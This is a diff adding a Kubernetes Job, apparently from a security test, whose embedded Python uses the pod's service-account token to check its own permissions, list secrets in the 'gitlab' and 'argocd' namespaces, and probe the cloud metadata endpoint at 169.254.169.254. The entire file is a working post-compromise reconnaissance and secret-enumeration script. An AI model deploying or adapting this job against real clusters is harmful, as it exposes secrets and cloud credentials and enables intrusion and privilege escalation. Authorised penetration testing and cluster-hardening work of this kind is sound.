@@ -1,0 +1,29 @@
+{
+  "apiVersion": "batch/v1",
+  "kind": "Job",
+  "metadata": {
+    "name": "argo-recon3",
+    "namespace": "argo-marker-test"
+  },
+  "spec": {
+    "ttlSecondsAfterFinished": 600,
+    "template": {
+      "spec": {
+        "restartPolicy": "Never",
+        "containers": [
+          {
+            "name": "recon",
+            "image": "python:3.12-alpine",
+            "command": [
+              "python3",
+              "-c"
+            ],
+            "args": [
+              "\nimport urllib.request, ssl, json\nSA=\"/var/run/secrets/kubernetes.io/serviceaccount\"\ntok=open(SA+\"/token\").read().strip()\nctx=ssl.create_default_context(cafile=SA+\"/ca.crt\")\ndef req(path, body=None, hdrs=None):\n    h={\"Authorization\":\"Bearer \"+tok}; h.update(hdrs or {})\n    r=urllib.request.Request(\"https://kubernetes.default.svc\"+path, data=body, headers=h, method=\"POST\" if body else \"GET\")\n    try:\n        resp=urllib.request.urlopen(r, context=ctx, timeout=10)\n        return resp.status, resp.read()[:3000].decode(errors=\"replace\")\n    except urllib.error.HTTPError as e:\n        return e.code, e.read()[:1500].decode(errors=\"replace\")\nprint(\"== selfsubjectrulesreview gitlab ==\")\nb=json.dumps({\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"gitlab\"}}).encode()\nst,bd=req(\"/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\", b, {\"Content-Type\":\"application/json\"})\nprint(st,bd[:2500])\nprint(\"== list secrets gitlab ==\")\nst,bd=req(\"/api/v1/namespaces/gitlab/secrets?limit=10\")\nprint(st,bd[:1200])\nprint(\"== list secrets argocd ==\")\nst,bd=req(\"/api/v1/namespaces/argocd/secrets?limit=10\")\nprint(st,bd[:1200])\nprint(\"== IMDS probe ==\")\ntry:\n    r=urllib.request.urlopen(\"http://169.254.169.254/latest/meta-data/\", timeout=4)\n    print(r.status, r.read()[:200].decode(errors=\"replace\"))\nexcept Exception as e:\n    print(\"IMDS:\", e)\n"
+            ]
+          }
+        ]
+      }
+    }
+  }
+}
